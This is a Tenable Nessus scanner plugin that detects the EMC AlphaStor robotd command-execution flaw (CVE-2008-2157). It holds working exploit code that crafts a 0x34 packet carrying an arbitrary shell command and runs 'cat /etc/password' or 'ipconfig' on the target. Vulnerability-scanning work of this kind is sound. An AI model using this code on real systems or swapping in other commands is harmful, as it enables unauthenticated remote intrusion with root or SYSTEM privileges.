#
# (C) Tenable Network Security, Inc.
#




include("compat.inc");

if (description) {
  script_id(33284);
  script_version("$Revision: 1.15 $");
  script_cve_id("CVE-2008-2157");
  script_bugtraq_id(29398);
  script_osvdb_id(45715);

  script_name(english:"EMC AlphaStor Device Manager robotd Remote Code Execution");
  script_summary(english:"Checks AlphaStor Library Manager robotd command execution");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute code on the remote tape backup manager." );
 script_set_attribute(attribute:"description", value:
"The installed instance of AlphaStor Device Manager is vulnerable to a 
command execution flaw when it receives a packet with a 0x34 code.
Packet string argument is used unsanitized as a call to the 'system'
function.

An unauthenticated, remote attacker may be able to exploit this flaw to
execute code on the remote host with SYSTEM/root privileges." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?666077ae" );
 script_set_attribute(attribute:"solution", value:
"Fix is available in knowledgebase article emc186391." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
 script_cwe_id(20);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/07/01");
 script_cvs_date("$Date: 2015/09/24 20:59:28 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("alphastor_libmanager_detect.nasl");
  script_require_ports("Services/alphastor-devicemanager", 3000);

  exit(0);
}


include("byte_func.inc");


function mk_command(cmd, s)
{
 local_var len;

 len = strlen(s);

 return mkbyte(cmd + 0x41) + s + crap(data:mkbyte(0), length:0x200-len) + mkbyte(0);
}


function execute_command(port, cmd)
{
 local_var soc, req, res, code, len;

 soc = open_sock_tcp(port); 
 if (!soc) exit(0);

 req = mk_command(cmd:0x34, s:cmd);
 send(socket:soc, data:req);

 res = recv(socket:soc, length:8, min:8);
 if (isnull(res) || strlen(res) < 8) exit(0);

 code = getdword(blob:res, pos:0);
 len = getdword(blob:res, pos:4);

 if (code != 0) return NULL;

 res = recv(socket:soc, length:len, min:len);
 if (isnull(res) || strlen(res) < len) exit(0);

 return substr(res, 0, len-2);
}


port = get_kb_item("Services/alphastor-devicemanager");
if (!port) port = 3000;
if (!get_port_state(port)) exit(0);


cmd = "cat /etc/password";

res = execute_command(port:port, cmd:cmd);
if (!res)
{
 cmd = "ipconfig";
 res = execute_command(port:port, cmd:cmd);
}

if (!res) exit(0);

report = string (
         "\nThe output of the command '", cmd, "' is:\n\n",
         res );

security_hole(port:port, extra:report);
